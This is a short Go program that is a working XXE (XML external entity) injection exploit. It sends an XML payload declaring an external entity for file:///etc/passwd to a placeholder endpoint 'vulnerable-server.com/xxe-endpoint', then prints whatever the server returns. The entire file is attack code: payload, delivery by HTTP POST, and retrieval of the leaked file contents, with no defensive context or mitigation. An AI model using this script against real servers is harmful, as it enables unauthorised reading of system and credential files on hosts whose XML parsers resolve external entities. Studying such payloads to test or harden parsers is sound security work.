package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {

	// Define the URL of the vulnerable server
	url := "http://vulnerable-server.com/xxe-endpoint"

	// Create an XML payload with an XXE injection
	payload := `
		<!DOCTYPE foo [
		<!ELEMENT foo ANY >
		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<foo>&xxe;</foo>
	`

	// Send the payload to the server using an HTTP POST request
	resp, err := http.Post(url, "application/xml", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Error sending payload:", err)
		return
	}

	// Read the response from the server
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	// Print the response from the server
	fmt.Println(string(body))
}
